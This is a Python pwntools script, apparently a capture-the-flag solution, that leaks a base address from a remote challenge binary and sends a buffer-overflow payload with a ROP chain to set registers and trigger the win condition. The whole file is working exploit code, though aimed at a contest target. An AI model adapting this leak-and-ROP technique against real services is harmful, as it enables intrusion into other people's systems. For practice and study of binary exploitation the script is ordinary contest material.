from pwn import *

r = remote("maze.chal.perfect.blue", 1)

b = ELF("./bof.bin", checksec=False)
rop = ROP(b)

r.sendlineafter(b"(Y/n) ", b"n")
r.recvuntil(b"ef be ad de ")
leak = r.recv(11).decode("utf-8").split(" ")
base_text = (int(leak[3], 16) << 24) + (int(leak[2], 16) << 16) + (int(leak[1], 16) << 8) + int(leak[0], 16) - 0x4f5c
log.info("base_text: {}".format(hex(base_text)))

pop_eax_int3 = base_text + 0x13AD
pop_esi_edi_ebp = base_text + rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

payload = b"A"*48 # padding
payload += b"flag" # secret
payload += b"A"*12 # padding
payload += p32(pop_esi_edi_ebp) + p32(0x1337) + p32(0x31337) + p32(0) # mov esi, 0x1337; mov edi, 0x31337; mov ebp, 0
payload += p32(pop_eax_int3) + p32(1) # mov eax, 1; int3

r.sendlineafter(b"Input some text: ", payload)

r.interactive()